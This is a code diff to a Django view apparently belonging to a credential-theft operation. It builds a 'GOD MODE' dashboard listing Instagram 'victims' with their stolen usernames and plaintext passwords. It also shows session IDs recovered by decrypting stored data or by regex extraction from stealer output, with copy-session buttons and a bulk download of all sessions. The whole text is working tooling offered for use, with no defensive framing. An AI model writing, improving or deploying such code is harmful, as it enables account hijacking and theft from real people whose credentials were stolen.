@@ -60,92 +60,89 @@ def login_view(request):
             "active": success
         })
 
-# core/views.py → FINAL DASHBOARD THAT SHOWS 100%
+
+
+# core/views.py → FINAL DASHBOARD THAT NEVER CRASHES
 def dashboard(request):
     victims = []
     total = InstagramAccount.objects.count()
     active = InstagramAccount.objects.filter(is_active=True).count()
     
-    # FIX: ADD .order_by('-created_at') AND LIMIT
-    for acc in InstagramAccount.objects.all().order_by('-created_at')[:200]:
+    for acc in InstagramAccount.objects.all().order_by('-created_at')[:500]:
+        sessionid = "NO_SESSION"
         try:
+            # TRY TO DECRYPT (for login_view sessions)
             decrypted = fernet.decrypt(acc.session_data.encode()).decode()
             data = json.loads(decrypted)
-            sessionid = data.get("authorization_data", {}).get("sessionid", "NO_SESSION")
-            victims.append({
-                "username": acc.username,
-                "password": acc.password,
-                "sessionid": sessionid,
-                "active": acc.is_active,
-                "time": acc.created_at.strftime("%b %d %H:%M")
-            })
-        except Exception as e:
-            # EVEN IF DECRYPT FAILS → STILL SHOW
-            victims.append({
-                "username": acc.username or "ERROR_USER",
-                "password": acc.password or "ERROR",
-                "sessionid": "DECRYPT_FAILED",
-                "active": False,
-                "time": "ERROR"
-            })
+            sessionid = data.get("authorization_data", {}).get("sessionid") or \
+                       data.get("sessionid") or \
+                       str(data)
+        except:
+            # IF FAILS → TRY RAW EXTRACTION (for pc-stealer, reel, etc)
+            try:
+                # Some sessions are stored as {"authorization_data": {"sessionid": "xxx"}}
+                raw = acc.session_data
+                if "sessionid" in raw:
+                    import re
+                    match = re.search(r'sessionid["\']?:\s*["\']([^"\']+)', raw)
+                    if match:
+                        sessionid = match.group(1)
+                    else:
+                        sessionid = "ENCRYPTED_SESSION"
+                else:
+                    sessionid = "RAW_DATA"
+            except:
+                sessionid = "ERROR"
 
-    # FIX: BUILD HTML WITH REAL DATA
+        victims.append({
+            "username": acc.username or "UNKNOWN",
+            "password": acc.password or "STOLEN",
+            "sessionid": sessionid[:100] + ("..." if len(sessionid) > 100 else ""),
+            "active": acc.is_active,
+            "time": acc.created_at.strftime("%b %d %H:%M")
+        })
+
     cards = ""
     for v in victims:
-        border = "border-green-500 shadow-green-500/50" if v["active"] else "border-red-800"
+        border = "border-green-500" if v["active"] else "border-red-800"
         status = "ACTIVE" if v["active"] else "FAILED"
-        js = f"navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED!';setTimeout(()=>this.innerText='COPY SESSION',2000)"
+        js = f"navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED!';setTimeout(()=>this.innerText='COPY',2000)"
         cards += f'''
-        <div class="bg-gray-900 border-4 {border} rounded-2xl p-8 transform hover:scale-105 transition-all shadow-2xl">
-            <div class="flex justify-between items-center">
-                <div>
-                    <h3 class="text-3xl font-bold text-cyan-400">@{v["username"]}</h3>
-                    <p class="text-yellow-300 text-xl">Pass: {v["password"]}</p>
-                    <p class="text-gray-500">{v["time"]}</p>
-                </div>
-                <div class="text-right">
-                    <button onclick="{js}" 
-                            class="bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 px-8 py-4 rounded-xl font-bold text-xl shadow-lg">
-                        COPY SESSION
-                    </button>
-                    <p class="mt-3 text-2xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">
-                        {status}
-                    </p>
-                </div>
-            </div>
+        <div class="bg-gray-900 border-4 {border} rounded-2xl p-8 shadow-2xl">
+            <h3 class="text-4xl font-bold text-cyan-400">@{v["username"]}</h3>
+            <p class="text-yellow-300 text-xl">Pass: {v["password"]}</p>
+            <p class="text-gray-500 text-lg">{v["time"]}</p>
+            <button onclick="{js}" class="mt-4 bg-gradient-to-r from-green-500 to-teal-600 px-8 py-4 rounded-xl font-bold text-xl">
+                COPY SESSION
+            </button>
+            <p class="mt-2 text-2xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">{status}</p>
         </div>
         '''
 
     html = f'''<!DOCTYPE html>
-<html>
+<html class="bg-black text-white">
 <head>
-    <title>SESSION EXTRACTOR PRO</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>GOD MODE DASHBOARD</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-black text-white min-h-screen p-8">
-    <h1 class="text-center text-7xl font-bold mb-8 text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-cyan-500">
-        SESSION EXTRACTOR PRO
+<body class="min-h-screen p-10">
+    <h1 class="text-center text-8xl font-bold bg-gradient-to-r from-red-500 to-purple-600 bg-clip-text text-transparent">
+        GOD MODE ACTIVE
     </h1>
-    <div class="text-center text-4xl mb-10">
-        TOTAL: <span class="text-green-400">{total}</span> | 
-        ACTIVE: <span class="text-lime-400">{active}</span>
+    <div class="text-center text-5xl mt-8">
+        TOTAL: <span class="text-green-400">{total}</span> | ACTIVE: <span class="text-lime-400">{active}</span>
     </div>
-    
-    <div class="grid gap-8 max-w-7xl mx-auto">
-        {cards or "<h2 class='text-center text-4xl text-red-500'>NO SESSIONS YET</h2>"}
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10 mt-16 max-w-7xl mx-auto">
+        {cards or "<h2 class='text-6xl text-red-600 text-center col-span-3'>NO VICTIMS YET</h2>"}
     </div>
-    
-    <div class="text-center mt-16">
-        <a href="/download-json/" class="inline-block bg-purple-700 hover:bg-purple-800 px-16 py-8 rounded-3xl text-4xl font-bold shadow-2xl transform hover:scale-110 transition-all">
-            DOWNLOAD ALL (.JSON)
+    <div class="text-center mt-20">
+        <a href="/download-json/" class="bg-purple-800 hover:bg-purple-900 px-20 py-8 rounded-3xl text-5xl font-bold">
+            DOWNLOAD ALL SESSIONS
         </a>
     </div>
 </body>
 </html>'''
     return HttpResponse(html)
-
-
 
 
 
